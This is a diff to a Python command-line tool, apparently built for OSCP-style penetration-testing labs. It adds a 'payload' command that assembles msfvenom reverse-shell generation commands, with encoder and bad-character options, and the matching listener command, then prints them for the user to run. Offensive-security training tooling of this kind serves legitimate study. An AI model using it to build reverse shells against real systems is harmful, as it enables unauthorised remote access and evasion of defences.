@@ -272,6 +272,54 @@ def exploit_cmd(
     raise typer.Exit(0)
 
 
+@app.command("payload")
+def payload_cmd(
+    payload: str | None = typer.Argument(
+        None, help="Payload id (see `nabu-cli payload` with no args) or a raw msfvenom -p string."
+    ),
+    lhost: str = typer.Option("", "--lhost", "-l", help="Your VPN/tun0 IP (LHOST)."),
+    lport: int = typer.Option(4444, "--lport", "-P", help="Listener port (LPORT)."),
+    fmt: str = typer.Option("", "--format", "-f", help="Output format (default: payload's own)."),
+    encoder: str = typer.Option("", "--encoder", "-e", help="Encoder, e.g. x86/shikata_ga_nai."),
+    iterations: int = typer.Option(1, "--iterations", "-i", help="Encoder iterations."),
+    badchars: str = typer.Option("", "--badchars", "-b", help=r"Bad chars, e.g. \x00\x0a."),
+    out: str = typer.Option("", "--out", "-o", help="Output file (default: shell.<ext>)."),
+) -> None:
+    """Build an msfvenom reverse-shell payload + its listener (display-only — copy and run it)."""
+    from oscprecon.exploit import msfvenom
+
+    if payload is None:
+        typer.echo("msfvenom payload builder — pick an id:\n")
+        for plat in msfvenom.PLATFORMS:
+            typer.echo(f"── {plat.label} ──")
+            for p in plat.payloads:
+                flag = "  [meterpreter=one-use]" if p.meterpreter else ""
+                typer.echo(f"  {p.id:19} {p.payload}{flag}")
+            typer.echo("")
+        typer.echo("e.g.  nabu-cli payload win-x64-stageless -l 10.10.14.7 -P 443")
+        raise typer.Exit(0)
+
+    result = msfvenom.build_command(
+        msfvenom.MsfvenomSpec(
+            payload=payload,
+            fmt=fmt,
+            lhost=lhost,
+            lport=lport,
+            encoder=encoder,
+            iterations=iterations,
+            badchars=badchars,
+            outfile=out,
+        )
+    )
+    typer.echo("# generate the payload (on Kali):")
+    typer.echo(result.command)
+    typer.echo("\n# catch the shell (start this first):")
+    typer.echo(result.listener)
+    for note in result.notes:
+        typer.echo(f"\n⚠ {note}")
+    raise typer.Exit(0)
+
+
 def main() -> None:
     app()
 
